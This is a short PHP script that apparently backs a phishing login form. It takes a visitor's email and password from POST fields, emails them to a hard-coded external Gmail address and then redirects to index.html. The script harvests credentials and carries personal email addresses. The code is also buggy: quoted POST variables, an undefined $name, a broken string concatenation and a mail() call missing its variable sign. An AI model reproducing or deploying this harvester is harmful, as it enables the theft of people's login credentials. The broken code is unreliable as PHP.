<?php
	
	$visitor_email = '$_POST[email]';
	$password = '$_POST[password]';


	$emai_from = 'shubhamkanwar216@gmail.com';

	$email_subject = "New Form";

	$email_body = "User email: $name.\n".
					"user password: $password.\n".


	$to = "shubhakanwar10650@gmail.com";
	
	$headers = "From: $emai_from\r\n";


	$headers .= "Reply-To: $visitor_email \r\n";

	mail(to,$email_subject,$email_body, $headers);

	header("Location: index.html");




?>